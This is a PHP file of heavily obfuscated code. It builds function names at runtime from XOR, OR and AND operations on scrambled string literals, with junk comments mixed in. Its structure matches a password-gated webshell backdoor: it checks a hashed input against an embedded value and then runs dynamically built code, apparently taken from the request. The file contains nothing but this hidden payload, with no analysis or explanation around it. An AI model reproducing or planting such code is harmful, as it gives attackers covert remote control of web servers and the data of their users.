<?php
$ePjjtaycc__='Gn_ztVd'&idR5;$Euh6ZXBBQ='b1 38'.xwiiht^'/'.oidt0H.'$&G7';$FXvLEAXw='Uhw[l^x^'.
             'x&e'^tSHiNe.'/gR`H';$AKiY52=']wO'&']U_';$hJTS='}w2?}.'&'D-0r]/';$pMC=#bfYRouU'.
             '!@@G!X'|'"@'.DQ2X;$buKdqFsI=KBDR.'$'.XQ0T.'(*'.Ev7Q3.'&.[HQ'|KRLR.'(JV&@(.C.#'.
             'U)4=PP@';$DR='Q86=[X"EFF(Y$--'^'"NC^.?}";8S/MBC';$Vxc_qdQcpi=#quZl6O4Sb5qOPhW'.
             'C<TA1=}*-M.?.(0'^',N;,MX"DZ#'.IBAGN;$Nw='BVV`wq'&'Ld]F_O';$PXWC4Bk='2'|'"';/*'.
             'nie0h!*/$QHp85hR6=DSE|'=X@';$gGNGj3w=']9AH'|'H|(8';$xeuXaa3BNPd='$jt'^#K9EV1X'.
             '|;I';$bZhxA9R=H|B;$nyUzTHwk=B|o;$Vjxlbd="Z]".UU_X_OokIM_oW&#jjf_mK_p4X6Qz54fW'.
             'lv~x_]_~__[Q_]}';$FD6=SICQHO.'@Y'|'P@@S@IPF';$_H8Uz='nkj*+7'^',.+xne';'Yprw4C'.
             '_-cb_m({9W';$mGfY1XJP8=']|yy&:@Of,'.DFFs.'(MQ'^'8?'.HHEyq.'"?t#2$4D90';'SfUZx'.
             '[n6d';$wcW6=$Euh6ZXBBQ^$FXvLEAXw;$eH0ua1AylV=$AKiY52^('  h'|'01z');'IwGO_6ReE'.
             '-2~';$jUbJ5z95Xy=$hJTS^$pMC;$GTQB=(': )$q("'.F0II.'"!@0CH]89:'|') )5C 0'./*bI'.
             'E;3+*/D8IE.'"!T$'.URI2.'#*')^$buKdqFsI;$MLLXQ=$DR&$Vxc_qdQcpi;$znWaGafiQi=/*G'.
             'dV#==:ZC*/$Nw|('Y['.pPoD&hpKxJy);if(!$wcW6($eH0ua1AylV($jUbJ5z95Xy(/*hYU43RLf'.
             'U4-LX;*/$znWaGafiQi)),(uuy7tc5.'{e}5w{3myq;'.tc6m1wsu.';'.qycu&'='.l7umj.'}3{'.
             '9y7=4u=37og=u<5a33=;k>').$PXWC4Bk))$GTQB($QHp85hR6.$bZhxA9R.$nyUzTHwk./*idUVM'.
             ' F=Z*/$gGNGj3w,$MLLXQ(false,$jUbJ5z95Xy($Vjxlbd.$FD6.$_H8Uz)),$mGfY1XJP8./*rm'.
             'U)t[<*/$xeuXaa3BNPd);#j4>4h|xR z7RRVq:J;{-G5<Clz_MQekE)x7ZfP-Ou p;Q*Mxz5np*O'.
             'ju.qwVH0*&wRZNj}$f;oY$!pIQ[7Z;y9K1:HoV]Ip9c6}t>)Rb<9Oo*v&rN';